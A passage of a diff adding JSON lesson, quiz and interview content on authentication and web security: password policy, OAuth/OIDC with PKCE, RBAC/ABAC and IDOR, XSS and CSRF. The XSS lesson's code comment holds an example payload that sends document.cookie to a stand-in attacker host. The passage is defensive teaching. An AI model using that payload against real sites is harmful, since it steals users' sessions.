+          "type": "truefalse",
+          "prompt": "Current NIST guidance recommends forcing users to change passwords every 90 days.",
+          "answer": false,
+          "explanation": "NIST SP 800-63B advises against periodic forced rotation because it leads to weaker, predictable passwords. Change passwords when there is evidence of compromise."
+        },
+        {
+          "id": "auth-security-03-q08",
+          "type": "truefalse",
+          "prompt": "Locking an account permanently after 5 failed attempts can be abused to deny service to real users.",
+          "answer": true,
+          "explanation": "Attackers can deliberately fail logins to lock out victims. Prefer progressive delays, temporary throttling and challenges, plus MFA."
+        },
+        {
+          "id": "auth-security-03-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are recommended password policy elements?",
+          "options": [
+            "Minimum length requirement",
+            "Mandatory symbol and uppercase rules",
+            "Checking against known breached passwords",
+            "Allowing paste and password managers",
+            "Security questions as a recovery method"
+          ],
+          "answers": [
+            0,
+            2,
+            3
+          ],
+          "explanation": "Length, breach checks and password manager support improve real security. Composition rules and security questions are discouraged by NIST and OWASP."
+        },
+        {
+          "id": "auth-security-03-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: OWASP's first-choice password hashing algorithm is ___.",
+          "accept": [
+            "Argon2id",
+            "argon2"
+          ],
+          "explanation": "Argon2id combines resistance to side-channel and GPU attacks. OWASP lists scrypt, bcrypt and PBKDF2 as alternatives."
+        },
+        {
+          "id": "auth-security-03-q11",
+          "type": "interview",
+          "prompt": "How do you store passwords securely?",
+          "answer": "- Never store plaintext or encrypted passwords; use a slow, salted, adaptive hash: Argon2id (memory 19 MiB+, t=2, p=1 minimum), or scrypt/bcrypt (cost 10 to 12), PBKDF2-SHA256 600k iterations for FIPS.\n- Use a maintained library that generates a unique salt and encodes parameters in the hash string; optionally add a pepper kept in a secrets manager.\n- Tune cost to a few hundred ms, rehash on login when parameters change; run hashing off the main thread and rate limit login to prevent CPU exhaustion.\n- Compare via the library's verify (constant time). Migrate legacy MD5/SHA1 hashes by wrapping them (argon2(sha1(password))) and upgrading on next login.",
+          "level": "beginner",
+          "top": true
+        },
+        {
+          "id": "auth-security-03-q12",
+          "type": "interview",
+          "prompt": "Design protections for a login endpoint against brute force and credential stuffing.",
+          "answer": "- Rate limits keyed by IP and by account, with sliding windows and exponential delays; stricter for repeated failures.\n- Bot defences: WAF and bot detection, CAPTCHA or proof-of-work challenges after suspicious patterns rather than for everyone.\n- Breached password check at signup/change; MFA or passkeys, with risk-based step-up for new devices or locations.\n- Generic errors, equal timing (dummy hash), no enumeration on signup/reset.\n- Monitoring: alert on spikes of failures, distributed low-and-slow patterns; notify users of new-device logins.\n- Avoid permanent lockouts to prevent DoS against users.",
+          "level": "intermediate"
+        },
+        {
+          "id": "auth-security-03-q13",
+          "type": "interview",
+          "prompt": "Walk through a secure password reset flow.",
+          "answer": "- User submits email; always respond \"If an account exists, we sent a link\" with similar timing.\n- Generate 32 random bytes, store SHA-256 of it with user ID, expiry (30 to 60 min) and used flag; invalidate previous tokens.\n- Email a link built from a configured base URL (not the Host header) containing the raw token.\n- On submit: hash the token, look it up, check expiry and unused, validate new password policy, update hash, mark used.\n- Revoke all sessions and refresh tokens, send a confirmation email, require MFA if enabled before logging in. Rate limit both endpoints.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Password Storage Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP Authentication Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP Forgot Password Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-04-oauth-oidc",
+      "title": "OAuth 2.0, OpenID Connect and PKCE",
+      "level": "intermediate",
+      "summary": "What OAuth 2.0 and OIDC actually solve, the Authorization Code flow with PKCE step by step, and which flows to avoid.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "OAuth 2.0 is delegated authorization",
+          "body": "OAuth 2.0 lets a user grant an application (**client**) limited access to their resources on another service, without sharing their password. Roles:\n\n- **Resource owner**: the user.\n- **Client**: the app requesting access.\n- **Authorization server (AS)**: authenticates the user, gets consent, issues tokens (Google, Okta, Auth0, Keycloak, Entra ID).\n- **Resource server**: the API that accepts access tokens.\n\nThe client receives an **access token** (short-lived, sent as `Authorization: Bearer ...`) limited by **scopes** such as `calendar.read`, and optionally a **refresh token** to get new access tokens.\n\nOAuth by itself is **not authentication**: an access token says the client may access something, not who the user is to the client. Using it for login led to many vulnerabilities, which is why OIDC exists."
+        },
+        {
+          "heading": "OpenID Connect adds identity",
+          "body": "**OIDC** is an identity layer on top of OAuth 2.0. Request the `openid` scope (plus `profile`, `email`) and the AS (now called the OpenID Provider) also returns an **ID token**: a signed JWT for the client describing the authentication event: `iss`, `sub` (stable user ID at that provider), `aud` (your client ID), `exp`, `iat`, `nonce`, optionally `email`, `auth_time`, `acr`.\n\nRules: the **ID token is for the client** to learn who logged in, never send it to APIs as an access token. Identify users by `iss` + `sub`, not email (emails change and can be unverified). Discovery (`/.well-known/openid-configuration`) and JWKS endpoints let clients configure themselves and fetch signing keys. The **UserInfo** endpoint returns claims using the access token."
+        },
+        {
+          "heading": "Authorization Code flow with PKCE",
+          "body": "The recommended flow for essentially all clients (OAuth 2.1 makes PKCE mandatory):\n\n- Client generates a random **code_verifier** and its SHA-256 **code_challenge**, plus a random **state** (CSRF protection for the callback) and **nonce** (binds the ID token to this login).\n- Client redirects the browser to the AS `/authorize` with `response_type=code`, `client_id`, `redirect_uri`, `scope`, `state`, `code_challenge`, `code_challenge_method=S256`.\n- User logs in and consents. AS redirects back to `redirect_uri?code=...&state=...`.\n- Client checks `state`, then POSTs to `/token` (back channel) with the code, `redirect_uri` and `code_verifier` (plus client authentication for confidential clients).\n- AS verifies the verifier matches the challenge and returns access token, ID token and optionally a refresh token.\n\nPKCE stops an attacker who intercepts the authorization code (malicious app on the device, leaked logs) from redeeming it, because they do not have the verifier.",
+          "code": {
+            "lang": "js",
+            "source": "import crypto from \"node:crypto\";\n\nconst verifier = crypto.randomBytes(32).toString(\"base64url\");\nconst challenge = crypto.createHash(\"sha256\").update(verifier).digest(\"base64url\");\nconst state = crypto.randomBytes(16).toString(\"base64url\");\nconst nonce = crypto.randomBytes(16).toString(\"base64url\");\nreq.session.oauth = { verifier, state, nonce };\n\nconst url = new URL(\"https://auth.example.com/authorize\");\nurl.search = new URLSearchParams({\n  response_type: \"code\",\n  client_id: process.env.CLIENT_ID,\n  redirect_uri: \"https://app.example.com/callback\",\n  scope: \"openid profile email\",\n  state, nonce,\n  code_challenge: challenge,\n  code_challenge_method: \"S256\",\n}).toString();\nres.redirect(url.toString());\n\n// GET /callback?code=...&state=...\n// 1) compare state with session  2) POST /token with code + code_verifier\n// 3) validate ID token: signature (JWKS), iss, aud = client_id, exp, nonce"
+          }
+        },
+        {
+          "heading": "Other grants and what to avoid",
+          "body": "- **Client Credentials**: machine-to-machine; a backend authenticates as itself (no user) to get an access token.\n- **Device Authorization Grant**: TVs and CLIs without a browser; the user enters a code on another device.\n- **Refresh Token grant**: exchange a refresh token for new tokens.\n- **Implicit flow** (tokens returned in the URL fragment): **deprecated**; tokens leak via history, referrers and scripts. Use code + PKCE instead.\n- **Resource Owner Password Credentials** (client collects the user's password): **deprecated**; defeats the purpose of OAuth and blocks MFA and SSO.\n\nClient types: **confidential** clients (server-side apps) can keep a client secret or use private_key_jwt/mTLS; **public** clients (SPAs, mobile apps) cannot keep secrets, so they rely on PKCE. For SPAs the current best practice is a **BFF**: the backend does the OAuth flow as a confidential client and gives the browser only an HttpOnly session cookie."
+        },
+        {
+          "heading": "Common OAuth/OIDC vulnerabilities",
+          "body": "- **Open redirect / redirect_uri manipulation**: the AS must match redirect URIs exactly against a registered list (no wildcards), or codes and tokens can be sent to attackers.\n- **Missing state check**: login CSRF, where the attacker logs the victim into the attacker's account.\n- **Not validating the ID token** (aud, iss, nonce, signature) or accepting an access token minted for a different client.\n- **Account linking by email** across providers without verifying the email: account takeover.\n- **Over-broad scopes** and long-lived tokens.\n- **Mix-up attacks** when using multiple providers; check the `iss` parameter in the authorization response.\n\nUse certified libraries (openid-client for Node, or your framework's auth library) instead of hand-rolling the protocol."
+        }
+      ],
+      "keyPoints": [
+        "OAuth 2.0 is delegated authorization; OIDC adds authentication with an ID token.",
+        "Access tokens go to APIs; ID tokens are only for the client to learn who logged in.",
+        "Use Authorization Code + PKCE (S256) for all clients; OAuth 2.1 requires PKCE.",
+        "state protects the callback from CSRF; nonce binds the ID token to the login request.",
+        "Implicit and password grants are deprecated.",
+        "Client Credentials is for machine-to-machine; Device grant for input-constrained devices.",
+        "Identify users by iss + sub, match redirect URIs exactly, and use certified libraries."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-04-q01",
+          "type": "mcq",
+          "prompt": "What problem does PKCE solve?",
+          "options": [
+            "Encrypting the access token",
+            "Preventing an intercepted authorization code from being redeemed by someone without the original code_verifier",
+            "Refreshing tokens automatically",
+            "Replacing the need for HTTPS"
+          ],
+          "answer": 1,
+          "explanation": "The AS stores the code_challenge with the code and requires the matching code_verifier at the token endpoint. An attacker who steals only the code cannot produce the verifier."
+        },
+        {
+          "id": "auth-security-04-q02",
+          "type": "mcq",
+          "prompt": "Which token should a SPA send to your backend API in the Authorization header?",
+          "options": [
+            "The ID token",
+            "The access token issued for that API's audience",
+            "The refresh token",
+            "The authorization code"
+          ],
+          "answer": 1,
+          "explanation": "Access tokens are meant for resource servers and carry scopes and audience. ID tokens are for the client; their aud is the client ID, not the API."
+        },
+        {
+          "id": "auth-security-04-q03",
+          "type": "mcq",
+          "prompt": "Which flow should a backend batch job use to call another service's API with no user involved?",
+          "options": [
+            "Authorization Code + PKCE",
+            "Implicit",
+            "Client Credentials",
+            "Device Authorization"
+          ],
+          "answer": 2,
+          "explanation": "Client Credentials lets a confidential client authenticate as itself and receive a token for its own permissions. The other flows involve a user."
+        },
+        {
+          "id": "auth-security-04-q04",
+          "type": "mcq",
+          "prompt": "What is the purpose of the state parameter in the authorization request?",
+          "options": [
+            "Store the access token",
+            "Protect the redirect callback against CSRF by tying the response to the session that started it",
+            "Specify the scopes",
+            "Encrypt the code"
+          ],
+          "answer": 1,
+          "explanation": "The client stores a random state before redirecting and checks it on callback. Without it an attacker can inject their own code and log the victim into the attacker's account."
+        },
+        {
+          "id": "auth-security-04-q05",
+          "type": "mcq",
+          "prompt": "You implement \"Sign in with Google\" and Microsoft. How should you uniquely identify a user from an ID token?",
+          "options": [
+            "By the email claim",
+            "By the combination of iss and sub",
+            "By the name claim",
+            "By the access token value"
+          ],
+          "answer": 1,
+          "explanation": "sub is unique and stable only within its issuer. Email can change, be reused or be unverified, and linking accounts by email across providers has led to account takeovers."
+        },
+        {
+          "id": "auth-security-04-q06",
+          "type": "mcq",
+          "prompt": "Why is the Implicit flow deprecated?",
+          "options": [
+            "It is too slow",
+            "Tokens are returned in the URL fragment where they can leak via history, referrers or injected scripts, and there is no sender binding",
+            "It requires a client secret",
+            "It does not support scopes"
+          ],
+          "answer": 1,
+          "explanation": "OAuth 2.0 Security Best Current Practice (RFC 9700) recommends Authorization Code with PKCE instead. Browsers now support CORS and fetch, so the original reason for implicit no longer applies."
+        },
+        {
+          "id": "auth-security-04-q07",
+          "type": "truefalse",
+          "prompt": "OAuth 2.0 by itself is an authentication protocol that tells the client who the user is.",
+          "answer": false,
+          "explanation": "OAuth 2.0 delegates authorization. OIDC adds standardised authentication via the ID token, discovery and UserInfo."
+        },
+        {
+          "id": "auth-security-04-q08",
+          "type": "truefalse",
+          "prompt": "An authorization server should match the redirect_uri exactly against pre-registered values.",
+          "answer": true,
+          "explanation": "Exact matching prevents attackers from sending codes or tokens to URLs they control via open redirects or lax pattern matching."
+        },
+        {
+          "id": "auth-security-04-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which must a client validate in an OIDC ID token?",
+          "options": [
+            "Signature using the provider's JWKS",
+            "iss equals the expected issuer",
+            "aud contains the client's own client_id",
+            "nonce matches the value sent in the request",
+            "That the token was issued by any OIDC provider"
+          ],
+          "answers": [
+            0,
+            1,
+            2,
+            3
+          ],
+          "explanation": "Signature, issuer, audience, expiry and nonce must all be checked. Accepting tokens from any provider would allow trivial forgery."
+        },
+        {
+          "id": "auth-security-04-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: in PKCE, the client sends code_challenge_method=___ meaning the challenge is the SHA-256 hash of the verifier.",
+          "accept": [
+            "S256"
+          ],
+          "explanation": "S256 is required whenever possible. The plain method sends the verifier itself and offers little protection."
+        },
+        {
+          "id": "auth-security-04-q11",
+          "type": "interview",
+          "prompt": "Explain the OAuth 2.0 Authorization Code flow with PKCE.",
+          "answer": "- Client creates code_verifier (random) and code_challenge = BASE64URL(SHA256(verifier)), plus state and (for OIDC) nonce, and stores them in the session.\n- Browser is redirected to /authorize with response_type=code, client_id, redirect_uri, scope, state, code_challenge, method S256.\n- User authenticates and consents at the authorization server, which redirects back with code and state.\n- Client verifies state, then calls /token server-to-server with code, redirect_uri, code_verifier (and client credentials if confidential).\n- AS checks the verifier against the stored challenge and returns access token (+ ID token with openid scope, + refresh token).\n- Client validates the ID token, creates its own session, and uses the access token for APIs. PKCE prevents code interception attacks; state prevents CSRF on the callback.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-04-q12",
+          "type": "interview",
+          "prompt": "What is the difference between OAuth 2.0 and OpenID Connect?",
+          "answer": "OAuth 2.0 is a framework for delegated authorization: it issues access tokens that let a client call an API on the user's behalf within scopes. It does not define how the client learns who the user is.\nOpenID Connect is a thin identity layer on OAuth 2.0: with the openid scope the provider also returns an ID token (signed JWT about the authentication: iss, sub, aud, nonce, auth_time), plus standard claims, discovery, JWKS and the UserInfo endpoint.\nUse OIDC for login (\"Sign in with...\", enterprise SSO); use OAuth access tokens for API authorization. Never use an access token as proof of login for your app, and never send ID tokens to APIs.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-04-q13",
+          "type": "interview",
+          "prompt": "How should a single-page application handle OAuth tokens securely?",
+          "answer": "Preferred: the Backend-for-Frontend pattern. The SPA's own backend acts as a confidential OAuth client, runs code + PKCE, stores tokens server-side, and gives the browser an HttpOnly, Secure, SameSite session cookie. API calls go through the BFF, which attaches access tokens. No tokens are exposed to JavaScript.\nIf a pure browser client is unavoidable: code + PKCE as a public client, access tokens in memory only, short lifetimes, refresh token rotation with reuse detection (or none), strict CSP to reduce XSS risk, and consider DPoP to sender-constrain tokens.\nAvoid implicit flow and localStorage for tokens.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OAuth 2.0 Security Best Current Practice (RFC 9700)",
+          "url": "https://www.rfc-editor.org/rfc/rfc9700"
+        },
+        {
+          "title": "RFC 7636: Proof Key for Code Exchange (PKCE)",
+          "url": "https://www.rfc-editor.org/rfc/rfc7636"
+        },
+        {
+          "title": "OpenID Connect Core 1.0",
+          "url": "https://openid.net/specs/openid-connect-core-1_0.html"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-05-authz-libraries",
+      "title": "Authorization (RBAC, ABAC, ReBAC) and auth libraries",
+      "level": "intermediate",
+      "summary": "Model permissions correctly, avoid broken object level authorization, and choose between Auth.js, Better Auth, Clerk and other providers.",
+      "estMinutes": 35,
+      "lesson": [
+        {
+          "heading": "Authorization models",
+          "body": "- **RBAC (role-based)**: users get roles (`admin`, `editor`, `viewer`); roles map to permissions (`invoice:read`, `invoice:approve`). Simple and auditable. Breaks down when rules depend on data (\"editors can edit only their own team's posts\"), leading to role explosion.\n- **ABAC (attribute-based)**: decisions evaluate attributes of the subject (department, clearance), resource (owner, status, tenant), action and environment (time, IP). Flexible and fine-grained, but policies get harder to reason about and test.\n- **ReBAC (relationship-based)**: permissions follow relationships in a graph (\"user is member of team, team is editor of folder, folder contains doc\"), as in Google Zanzibar. Implementations: OpenFGA, SpiceDB, Permify. Great for sharing models like Google Drive or GitHub.\n\nMost real systems combine them: roles for coarse access, plus ownership/tenant attributes checked on every resource."
+        },
+        {
+          "heading": "Enforcing authorization in code",
+          "body": "Principles:\n\n- **Deny by default**: every route requires an explicit policy; missing checks fail closed.\n- **Check on the server for every request**, never trust hidden UI buttons or client-provided roles.\n- **Check at the object level**: \"is this user allowed to access *this* invoice\", not just \"can users read invoices\". Missing object checks are **BOLA/IDOR** (Broken Object Level Authorization / Insecure Direct Object Reference), the top API vulnerability.\n- **Scope queries by tenant/owner** so the database itself only returns permitted rows (or use Postgres row-level security).\n- **Centralise policies** in one module or a policy engine (CASL, Casbin, Oso, Cerbos, OPA/Rego, AWS Cedar) instead of scattering `if (user.role === ...)` across handlers.\n- Log authorization failures; they often indicate probing.",
+          "code": {
+            "lang": "js",
+            "source": "// Policy module: one place to answer \"can user do action on resource?\"\nconst policies = {\n  \"invoice:read\":    (u, inv) => u.tenantId === inv.tenantId,\n  \"invoice:approve\": (u, inv) => u.tenantId === inv.tenantId &&\n                                 u.roles.includes(\"finance\") &&\n                                 inv.createdBy !== u.id,   // separation of duties\n};\n\nexport function authorize(user, action, resource) {\n  const rule = policies[action];\n  if (!rule || !rule(user, resource)) throw new ForbiddenError(action); // deny by default\n}\n\napp.post(\"/invoices/:id/approve\", requireAuth, async (req, res) => {\n  const invoice = await db.invoices.findOne({ id: req.params.id, tenantId: req.user.tenantId });\n  if (!invoice) return res.sendStatus(404);       // scoped query: other tenants look like 404\n  authorize(req.user, \"invoice:approve\", invoice);\n  res.json(await invoices.approve(invoice, req.user));\n});"
+          }
+        },
+        {
+          "heading": "Mass assignment and privilege escalation",
+          "body": "**Mass assignment**: `db.users.update(id, req.body)` lets a client send `{ \"role\": \"admin\" }` or `{ \"tenantId\": \"other\" }`. Always map input through an allowlist schema per operation.\n\n**Vertical escalation** is gaining higher privileges (user to admin endpoints); **horizontal escalation** is accessing peers' data (user A reading user B's orders). Test both: automated tests that call every endpoint as different roles and tenants catch most regressions."
+        },
+        {
+          "heading": "Auth libraries and providers",
+          "body": "Building authentication yourself means owning password storage, MFA, passkeys, sessions, OAuth, email verification, account recovery and bot protection. Options:\n\n- **Auth.js** (formerly NextAuth.js): open-source, OAuth/OIDC providers, email links, credentials, database or JWT sessions; strong Next.js integration. In 2025 the project came under the stewardship of the Better Auth team, which recommends Better Auth for new projects while Auth.js receives maintenance updates.\n- **Better Auth**: open-source, framework-agnostic TypeScript library that runs in your app and stores users in your own database; built-in email/password, social login, 2FA, passkeys, organizations and multi-tenancy, rate limiting, via plugins.\n- **Clerk**: hosted auth with prebuilt UI components, user management dashboard, organizations, and SDKs for Next.js, React and Express. Fast to integrate; costs scale with monthly active users and user data lives with the vendor.\n- Others: Auth0/Okta, WorkOS (enterprise SSO/SCIM), Supabase Auth, Firebase Auth, Amazon Cognito, Keycloak or Zitadel (self-hosted IdPs), Passport.js (older Express strategy middleware).\n\nDecision factors: data ownership and residency, cost at scale, enterprise needs (SAML SSO, SCIM provisioning, audit logs), UI customisation, framework fit, and lock-in."
+        }
+      ],
+      "keyPoints": [
+        "RBAC maps roles to permissions; ABAC evaluates attributes; ReBAC follows relationships (Zanzibar).",
+        "Deny by default and enforce authorization server-side on every request.",
+        "BOLA/IDOR (missing object-level checks) is the most common API vulnerability.",
+        "Scope queries by tenant and owner; consider Postgres row-level security.",
+        "Centralise policies (CASL, Casbin, Cerbos, OPA, Cedar) instead of scattered role checks.",
+        "Prevent mass assignment by allowlisting writable fields per operation.",
+        "Auth.js, Better Auth (self-hosted library) and Clerk (hosted) trade control, cost and speed differently."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-05-q01",
+          "type": "mcq",
+          "prompt": "GET /api/orders/1043 returns another customer's order when user A changes the ID. What is this vulnerability?",
+          "options": [
+            "XSS",
+            "CSRF",
+            "Broken Object Level Authorization (IDOR)",
+            "SQL injection"
+          ],
+          "answer": 2,
+          "explanation": "The endpoint authenticates the user but never checks that the order belongs to them. OWASP API Security Top 10 lists BOLA first."
+        },
+        {
+          "id": "auth-security-05-q02",
+          "type": "mcq",
+          "prompt": "A SaaS app needs rules like \"managers can approve expenses under $5,000 in their own department during business hours\". Which model fits best?",
+          "options": [
+            "Pure RBAC",
+            "ABAC",
+            "No authorization",
+            "Basic auth"
+          ],
+          "answer": 1,
+          "explanation": "The rule depends on attributes of the user (role, department), resource (amount, department) and environment (time). Expressing it with roles alone would require many special roles."
+        },
+        {
+          "id": "auth-security-05-q03",
+          "type": "mcq",
+          "prompt": "Which model is used by Google Zanzibar and OpenFGA for sharing documents and folders?",
+          "options": [
+            "RBAC",
+            "ABAC",
+            "ReBAC (relationship-based)",
+            "MAC"
+          ],
+          "answer": 2,
+          "explanation": "Zanzibar stores relationship tuples (user, relation, object) and computes permissions by traversing them, ideal for nested sharing hierarchies."
+        },
+        {
+          "id": "auth-security-05-q04",
+          "type": "mcq",
+          "prompt": "What is the vulnerability in this handler?",
+          "code": "app.patch(\"/me\", requireAuth, async (req, res) => {\n  const user = await db.users.update(req.user.id, req.body);\n  res.json(user);\n});",
+          "options": [
+            "None",
+            "Mass assignment: a user can set any column, including role or tenantId",
+            "XSS",
+            "Timing attack"
+          ],
+          "answer": 1,
+          "explanation": "Passing req.body directly to an update lets clients set fields they should never control. Parse input with a schema that allows only editable fields such as name and avatar."
+        },
+        {
+          "id": "auth-security-05-q05",
+          "type": "mcq",
+          "prompt": "The admin panel hides the Delete button from non-admins, but DELETE /api/users/:id has no role check. Is that acceptable?",
+          "options": [
+            "Yes, the UI prevents it",
+            "No, attackers call the API directly; authorization must be enforced server-side",
+            "Yes, if the API uses HTTPS",
+            "Yes, if CORS is configured"
+          ],
+          "answer": 1,
+          "explanation": "UI controls are a convenience, not a security boundary. Anyone can send requests with curl or devtools."
+        },
+        {
+          "id": "auth-security-05-q06",
+          "type": "mcq",
+          "prompt": "Which is a key trade-off of a hosted provider like Clerk compared with a library like Better Auth?",
+          "options": [
+            "Hosted providers cannot do social login",
+            "Faster setup and managed UI vs. vendor dependency, per-user cost and user data stored with the vendor",
+            "Libraries cannot store users in your database",
+            "Hosted providers do not support MFA"
+          ],
+          "answer": 1,
+          "explanation": "Hosted auth saves building and operating many features but adds cost at scale and lock-in. A library keeps data in your database and under your control, but you operate it."
+        },
+        {
+          "id": "auth-security-05-q07",
+          "type": "truefalse",
+          "prompt": "Returning 404 instead of 403 for resources in other tenants can prevent attackers from learning which IDs exist.",
+          "answer": true,
+          "explanation": "Scoping the lookup by tenant and returning 404 avoids confirming existence, which reduces enumeration. Internal logs should still record the attempt."
+        },
+        {
+          "id": "auth-security-05-q08",
+          "type": "truefalse",
+          "prompt": "If an endpoint requires a valid JWT, it is protected against IDOR.",
+          "answer": false,
+          "explanation": "Authentication proves identity, not permission for a specific object. Each object access still needs an ownership or policy check."
+        },
+        {
+          "id": "auth-security-05-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which practices strengthen authorization?",
+          "options": [
+            "Deny by default",
+            "Checking permissions only in the frontend",
+            "Scoping database queries by tenant/owner",
+            "Central policy functions or a policy engine",
+            "Automated tests calling endpoints as different users and tenants"
+          ],
+          "answers": [
+            0,
+            2,
+            3,
+            4
+          ],
+          "explanation": "Default deny, scoped queries, centralised policies and cross-user tests are core practices. Frontend-only checks are bypassable."
+        },
+        {
+          "id": "auth-security-05-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: OWASP's API Security Top 10 lists Broken ___ Level Authorization as API1.",
+          "accept": [
+            "Object"
+          ],
+          "explanation": "BOLA (API1:2023) covers missing checks that the caller may access the specific object referenced by an ID."
+        },
+        {
+          "id": "auth-security-05-q11",
+          "type": "interview",
+          "prompt": "RBAC vs ABAC: explain and say how you would implement authorization in a multi-tenant SaaS.",
+          "answer": "- RBAC: permissions grouped into roles assigned to users. Easy to understand and audit; coarse, leads to role explosion for contextual rules.\n- ABAC: policies over attributes of subject, resource, action and context. Fine-grained and expressive; needs good tooling and tests.\n- Implementation: tenant isolation first (tenantId on every row, every query scoped by the tenant from the session, optionally Postgres RLS as a safety net). Roles per tenant (owner, admin, member) for coarse permissions. Resource-level policies (ownership, status) in a central policy module or engine (CASL, Cerbos, OPA, Cedar), deny by default.\n- Enforce in the service layer on every request, log denials, and write tests asserting cross-tenant access fails. For complex sharing, consider ReBAC (OpenFGA).",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-05-q12",
+          "type": "interview",
+          "prompt": "How do you prevent IDOR/BOLA vulnerabilities across a large API?",
+          "answer": "- Make the safe path the default: repositories that require a user/tenant context and always scope queries, rather than findById(id) helpers anyone can call.\n- Central authorization middleware or policy checks per route, with a lint or test that fails if a route has no policy.\n- Opaque IDs reduce guessing but are not a control.\n- Integration tests per endpoint with two users/tenants asserting 403/404 for each other's resources; include in CI.\n- Database row-level security as defence in depth, plus monitoring for many 403/404s from one user.",
+          "level": "intermediate"
+        },
+        {
+          "id": "auth-security-05-q13",
+          "type": "interview",
+          "prompt": "Would you build authentication yourself, use a library like Better Auth/Auth.js, or a hosted provider like Clerk/Auth0? Justify.",
+          "answer": "Rarely build from scratch: the surface (password hashing, MFA, passkeys, OAuth/OIDC, sessions, recovery, bot defence) is large and security-critical.\n- Library (Better Auth, Auth.js): users in your DB, no per-MAU fees, full control and customisation; you run and secure it. Good for products wanting data ownership and moderate needs.\n- Hosted (Clerk, Auth0, WorkOS): fastest to ship, managed UIs, enterprise SSO/SCIM, compliance, anomaly detection; cost grows with users, vendor lock-in, data residency questions.\n- Self-hosted IdP (Keycloak, Zitadel): many apps needing central SSO with full control, at operational cost.\nI decide based on enterprise requirements, budget at projected scale, data residency, team capacity and framework fit.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Authorization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP API Security Top 10 (2023)",
+          "url": "https://api-security.owasp.org/editions/2023/en/0x11-t10/"
+        },
+        {
+          "title": "Better Auth documentation",
+          "url": "https://better-auth.com/docs/introduction"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-06-xss-csrf-cors",
+      "title": "Browser attacks: XSS, CSRF and CORS",
+      "level": "intermediate",
+      "summary": "How cross-site scripting and request forgery work, how to stop them, and what CORS does and does not protect.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "Cross-site scripting (XSS)",
+          "body": "XSS happens when attacker-controlled data is interpreted as code in a victim's browser on your origin. The injected script runs with full access to the page: it can read the DOM, call your APIs with the user's cookies, change content, and steal non-HttpOnly tokens.\n\n- **Stored XSS**: payload saved in the database (a comment, a profile name) and rendered to other users.\n- **Reflected XSS**: payload in the URL or request reflected straight into the response.\n- **DOM-based XSS**: client-side JavaScript writes untrusted data into a dangerous sink (`innerHTML`, `document.write`, `eval`, `location = \"javascript:...\"`).",
+          "code": {
+            "lang": "js",
+            "source": "// Vulnerable: user input becomes HTML\nel.innerHTML = \"Hello \" + new URLSearchParams(location.search).get(\"name\");\n// ?name=<img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>\n\n// Safe: treat input as text\nel.textContent = \"Hello \" + new URLSearchParams(location.search).get(\"name\");"
+          }
+        },
+        {
+          "heading": "Preventing XSS",
+          "body": "- **Context-aware output encoding**: React, Vue, Angular and server templates escape interpolated values by default. Danger zones are the escape hatches: `dangerouslySetInnerHTML`, `v-html`, `innerHTML`, unescaped template syntax, and building HTML strings.\n- **Sanitise** when you must render user HTML (rich text) with a maintained sanitizer like DOMPurify, with a strict allowlist.\n- **Validate URLs**: `href={userUrl}` can be `javascript:alert(1)`. Allow only `http:` and `https:` schemes.\n- **Content Security Policy** as defence in depth (nonce- or hash-based `script-src`, no `unsafe-inline`), plus **Trusted Types** to lock down DOM sinks.\n- **HttpOnly cookies** limit what XSS can steal, though the script can still act as the user while the page is open.\n- Serve user uploads from a separate domain and set `X-Content-Type-Options: nosniff`."
+        },
+        {
+          "heading": "Cross-site request forgery (CSRF)",
+          "body": "CSRF tricks a victim's browser into sending an authenticated request to your site from another site, using cookies the browser attaches automatically. For example, a hidden auto-submitting form on `evil.example` that POSTs to `bank.example/transfer`. The attacker cannot read the response, but the state change happens.\n\nCSRF only matters when authentication is ambient (cookies, HTTP Basic, client certs). APIs authenticated solely by an `Authorization: Bearer` header that JavaScript sets explicitly are not vulnerable to classic CSRF.\n\nDefences (use more than one for sensitive apps):\n\n- **SameSite cookies** (`Lax` or `Strict`) block cookies on cross-site POSTs.\n- **CSRF tokens**: synchronizer token stored in the session and embedded in forms, or the signed double-submit cookie pattern; the server rejects state-changing requests without a valid token.\n- **Check Origin / Sec-Fetch-Site headers** on state-changing requests; reject cross-site ones.\n- **Never change state on GET**, because Lax cookies are sent on top-level GET navigations.\n- Require JSON with `Content-Type: application/json` for APIs; cross-site HTML forms cannot send it without a CORS preflight.",
+          "code": {
+            "lang": "js",
+            "source": "// Lightweight CSRF protection using Fetch Metadata + Origin checks\nconst ALLOWED = new Set([\"https://app.example.com\"]);\napp.use((req, res, next) => {\n  if ([\"GET\", \"HEAD\", \"OPTIONS\"].includes(req.method)) return next();\n  const site = req.get(\"sec-fetch-site\");\n  if (site && site !== \"same-origin\" && site !== \"same-site\") return res.sendStatus(403);\n  const origin = req.get(\"origin\");\n  if (origin && !ALLOWED.has(origin)) return res.sendStatus(403);\n  next();\n});"
+          }
+        },
+        {
+          "heading": "CORS: relaxing the same-origin policy",
